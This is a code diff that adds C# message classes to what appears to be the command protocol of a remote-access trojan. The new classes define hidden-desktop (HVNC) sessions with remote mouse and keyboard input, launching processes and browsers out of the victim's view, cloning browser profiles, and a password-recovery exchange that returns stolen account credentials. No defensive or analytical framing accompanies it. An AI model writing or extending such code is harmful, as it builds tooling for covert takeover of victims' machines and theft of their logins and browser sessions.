@@ -869,4 +869,128 @@ public class FileChunkMessage : Message
         public string TaskXml { get; set; }
         public string ErrorMessage { get; set; }
     }
+
+    [Serializable]
+    public class StartHvncMessage : Message
+    {
+        public StartHvncMessage()
+        {
+            Type = "StartHvnc";
+        }
+
+        public string DesktopName { get; set; } = "hidden_desktop";
+        public int Quality { get; set; } = 80; // 10-100
+    }
+
+    // Stop HVNC session
+    [Serializable]
+    public class StopHvncMessage : Message
+    {
+        public StopHvncMessage()
+        {
+            Type = "StopHvnc";
+        }
+    }
+
+    // HVNC frame (screen capture from hidden desktop)
+    [Serializable]
+    public class HvncFrameMessage : Message
+    {
+        public HvncFrameMessage()
+        {
+            Type = "HvncFrame";
+        }
+
+        public byte[] ImageData { get; set; }
+        public int Width { get; set; }
+        public int Height { get; set; }
+    }
+
+    // Set HVNC quality
+    [Serializable]
+    public class SetHvncQualityMessage : Message
+    {
+        public SetHvncQualityMessage()
+        {
+            Type = "SetHvncQuality";
+        }
+
+        public int Quality { get; set; } // 10-100
+    }
+
+    // HVNC input (mouse/keyboard)
+    [Serializable]
+    public class HvncInputMessage : Message
+    {
+        public HvncInputMessage()
+        {
+            Type = "HvncInput";
+        }
+
+        public int MessageType { get; set; } // WM_LBUTTONDOWN, etc.
+        public int WParam { get; set; }
+        public int LParam { get; set; }
+    }
+
+    // Start process in hidden desktop
+    [Serializable]
+    public class HvncStartProcessMessage : Message
+    {
+        public HvncStartProcessMessage()
+        {
+            Type = "HvncStartProcess";
+        }
+
+        public string ProcessPath { get; set; }
+        public string Arguments { get; set; }
+    }
+
+    // Enable/disable browser profile cloning
+    [Serializable]
+    public class HvncBrowserCloneMessage : Message
+    {
+        public HvncBrowserCloneMessage()
+        {
+            Type = "HvncBrowserClone";
+        }
+
+        public bool Enable { get; set; }
+        public string BrowserType { get; set; } // Chrome, Firefox, Edge, Opera, OperaGX, Brave
+    }
+
+    // Quick launch browser in HVNC
+    [Serializable]
+    public class HvncLaunchBrowserMessage : Message
+    {
+        public HvncLaunchBrowserMessage()
+        {
+            Type = "HvncLaunchBrowser";
+        }
+
+        public string BrowserType { get; set; } // Chrome, Firefox, Edge, Opera, OperaGX, Brave
+        public bool CloneProfile { get; set; }
+    }
+
+    [Serializable]
+    public class PasswordRecoveryRequestMessage : Message
+    {
+        public PasswordRecoveryRequestMessage()
+        {
+            Type = "PasswordRecoveryRequest";
+        }
+    }
+
+    // Response containing recovered passwords
+    [Serializable]
+    public class PasswordRecoveryResponseMessage : Message
+    {
+        public PasswordRecoveryResponseMessage()
+        {
+            Type = "PasswordRecoveryResponse";
+        }
+
+        public List<RecoveredAccount> Accounts { get; set; }
+        public bool Success { get; set; }
+        public string ErrorMessage { get; set; }
+    }
 }
